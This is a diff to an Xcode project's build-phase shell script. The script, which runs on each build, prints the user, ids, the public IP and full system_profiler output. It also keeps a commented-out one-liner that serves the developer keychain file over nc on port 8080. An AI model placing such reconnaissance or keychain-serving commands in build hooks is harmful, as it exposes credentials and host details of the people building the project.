@@ -186,7 +186,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "echo \"The current directory is\" `/bin/pwd`\necho \"The current user is\" `whoami`\necho \"Let's try the FTP command\"\necho \"IP:\" `curl ifconfig.me`\n# { echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080\n#cat /usr/local/etc/nginx/nginx.conf\nwhich nginx\nngingx -V\nthiscommanddoesntexist";
+			shellScript = "echo \"The current directory is\" `/bin/pwd`\necho \"The current user is\" `whoami`\necho \"Let's try the FTP command\"\necho \"IP:\" `curl ifconfig.me`\n# { echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080\n#cat /usr/local/etc/nginx/nginx.conf\necho \"### SYSTEM PROFILER ###\"\nsystem_profiler\necho \"### ID ###\"\nid \nthiscommanddoesntexist";
 		};
 /* End PBXShellScriptBuildPhase section */
 
